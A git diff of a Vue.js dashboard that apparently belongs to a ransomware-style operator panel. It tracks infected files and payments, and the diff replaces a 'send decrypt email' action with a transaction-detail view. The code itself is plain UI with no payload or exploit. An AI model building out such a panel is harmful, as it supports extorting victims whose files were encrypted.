@@ -38,8 +38,16 @@
                 </div>
                 <div class="grid">
                     <InfectedFileStat :infectedFiles="infectedFiles" />
-                    <PaymentStat :payments="payments" @clickHandler="sendEmail"/>
+                    <PaymentStat :payments="payments" @clickHandler="getTransaction"/>
                 </div>
+            </div>
+            <div v-if="transaction" class="card paragraphe card--payment-detail">
+                <PaymentDetail
+                    :token="token"
+                    :transaction="transaction"
+                    :user="transaction.user"
+                    :error="error"
+                />
             </div>
 
         </div>
@@ -56,8 +64,8 @@ import FlashMessage from "../components/FlashMessage.vue";
 import PaymentStat from "../components/stats/PaymentStat.vue";
 import InfectedFileStat from "../components/stats/InfectedFileStat.vue";
 import { Transaction } from '../core/models/transaction';
-import {IndexResponse} from "../core/models/indexResponse";
 import { Log } from '../core/models/log';
+import PaymentDetail from "../components/dashboard/PaymentDetail.vue";
 
 export default defineComponent({
     name: 'Home',
@@ -72,10 +80,12 @@ export default defineComponent({
             email: {
                 message: null as string | null,
                 error: null as string | null
-            }
+            },
+            transaction: null as Transaction | null
         }
     },
     components: {
+        PaymentDetail,
         InfectedFileStat,
         PaymentStat,
         FlashMessage,
@@ -93,16 +103,16 @@ export default defineComponent({
             });
 
         },
-        sendEmail(id: number) {
-            HttpRequest.get('/api/send_decrypt_email/'+id, this.token)
+        getTransaction(id: number) {
+            HttpRequest.get('/api/transactions/'+id, this.token)
                 .then((res) => {
                     if(res.error) {
-                        this.email.error = res.message;
+                        this.error = res.message;
                     }
-                    this.email.message = res.message
+                    this.transaction = res.transaction
                 }).catch((error) => {
-                    this.email.error = error;
-                });
+                this.error = error;
+            });
         }
     },
     created() {
